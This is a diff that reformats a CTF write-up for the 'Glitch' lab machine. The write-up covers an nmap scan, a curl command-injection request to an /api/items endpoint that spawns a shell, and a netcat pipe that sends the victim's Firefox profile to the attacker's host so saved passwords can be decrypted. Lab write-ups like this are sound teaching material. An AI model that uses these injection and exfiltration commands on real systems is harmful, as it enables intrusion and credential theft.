@@ -1,6 +1,6 @@
-##Glitch
+## Glitch
 
-#Enumeration
+# Enumeration
 ```
 # Nmap 7.91 scan initiated Mon Apr 19 21:07:14 2021 as: nmap -sC -sV -oN nmap/initial 10.10.16.30
 Nmap scan report for 10.10.16.30
@@ -17,7 +17,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```
 Looks like just a web server running on port 80 so lets check it out
 
-#Web Server
+# Web Server
 Looking at the source code on port 80 we find the following
 ```
 <!DOCTYPE html>
@@ -152,15 +152,18 @@ curl -X POST http://10.10.16.30/api/items?cmd=require%28%27child_process%27%29.e
 ```
 We now have a shell spawned and can find the user flag in the home directory of user
 
-#Privilege Escalation
+# Privilege Escalation
 We find a .firefox directory with a profile amidst others and can use a script firefox_decrypt to extract the information. 
 On target
-
+```
 tar cf - .firefox/ | nc <our ip> <our port>
+```
 
 On our box
-
+```
 nc -lvp <our port> | tar xf -
+```
+
 we can then use the script as follow
 ```
 ./firefox_decrypt.py ../.firefox/b5w4643p.default-release
@@ -171,6 +174,7 @@ Website:   https://glitch.thm
 Username: 'v0id'
 Password: 'redacted'
 ```
+
 We can use this password to login as the v0id user.
 At this point however we can't really find anything to escalate further, so we can look at the hint and says sudo is bloat. Looking this up we find a video and links talking about using doas instead so lets give it a try
 ```
